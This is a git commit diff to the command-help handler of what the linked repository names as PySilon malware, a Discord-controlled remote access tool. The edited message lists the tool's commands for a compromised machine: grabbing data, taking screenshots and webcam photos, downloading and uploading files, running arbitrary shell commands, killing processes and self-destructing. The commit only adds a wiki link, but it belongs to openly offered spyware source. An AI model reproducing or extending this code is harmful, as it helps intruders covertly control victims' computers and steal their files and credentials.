dacd19c3c29d08a3aa0711080f92c933f95b76b4
whois-hoeless <whois@hoeless.com>
2023-06-05 23:48:14 +0200

    add the repo link

--- resources/source_code/helper.py
+++ resources/source_code/helper.py
@@ -1,4 +1,4 @@
 elif message.content[:5] == '.help':
     await message.delete()
     if message.content.strip() == '.help':
-        reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.cmd [command]\n.cd [dir]\n.update```'); await reaction_msg.add_reaction('🔴')
+        reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.cmd [command]\n.cd [dir]\n.update\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
